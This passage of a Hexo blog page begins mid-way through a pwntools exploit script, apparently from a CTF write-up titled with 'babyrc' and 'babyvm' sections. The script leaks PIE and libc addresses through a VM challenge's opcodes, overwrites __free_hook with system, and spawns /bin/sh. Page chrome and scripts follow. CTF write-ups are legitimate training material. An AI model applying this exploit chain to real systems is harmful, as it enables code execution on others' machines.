class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span> </span><br><span class="line">	gdb.attach(p, <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">		b *$rebase(0x0000000000000DAF)</span></span><br><span class="line"><span class="string">		&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execve</span>(<span class="params">opcode</span>):</span> </span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendline(opcode)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clear</span>():</span> </span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">piebase = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>)[-<span class="number">6</span>:]+<span class="string">&#x27;\x00\x00&#x27;</span>) - <span class="number">0x1398</span></span><br><span class="line">log.success(<span class="string">&#x27;piebase: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(piebase)))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;pwn&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span> + <span class="string">&#x27;/bin/sh&#x27;</span> + <span class="string">&#x27;\x00&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x4</span>-<span class="number">0x8</span>) + p64(piebase+<span class="number">0x202060</span>)[:<span class="number">6</span>])</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;1179403647&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binshaddr = <span class="number">0xFFFFFFFF</span> <span class="comment"># 其实也可以把binsh加到secret中，根据其余指令获得shell</span></span><br><span class="line">freegot = elf.got[<span class="string">&#x27;free&#x27;</span>] + piebase</span><br><span class="line">opcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>): </span><br><span class="line">	opcode += p8(<span class="number">0x31</span>)+p8(<span class="number">0x3</span>)+p64(freegot+i)+p8(<span class="number">0x53</span>)+p8(<span class="number">0</span>)</span><br><span class="line">opcode += p8(<span class="number">0x32</span>)</span><br><span class="line">execve(opcode)</span><br><span class="line"></span><br><span class="line">freeaddr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libcbase = freeaddr - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libcbase: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libcbase)))</span><br><span class="line">freehook = libcbase + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">clear()</span><br><span class="line">opcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>): </span><br><span class="line">	opcode += p8(<span class="number">0x31</span>)+p8(<span class="number">3</span>)+p64(freehook-<span class="number">1</span>+i)+p8(<span class="number">0x54</span>)+p8(<span class="number">0</span>) </span><br><span class="line">opcode += p8(<span class="number">0x31</span>)+p8(<span class="number">0</span>) + <span class="string">&#x27;/bin/sh&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">opcode += p8(<span class="number">0x32</span>)</span><br><span class="line">execve(opcode)</span><br><span class="line">p.sendline(p64(system)[<span class="number">0</span>:<span class="number">6</span>]+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">clear()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/WP/" rel="tag"># WP</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/11/26/Ucore-lab4/" rel="next" title="Ucore-lab4">
+                <i class="fa fa-chevron-left"></i> Ucore-lab4
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="http://qvb75z5z6.hn-bkt.clouddn.com/1605841888100229.jpeg"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/xxy1126" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:1335926819@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#babyrc"><span class="nav-number">1.</span> <span class="nav-text">babyrc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.1.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">1.2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">1.3.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#babyvm"><span class="nav-number">2.</span> <span class="nav-text">babyvm</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-1"><span class="nav-number">2.1.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-1"><span class="nav-number">2.2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp-1"><span class="nav-number">2.3.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Tm0tfl</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+</body>
+</html>
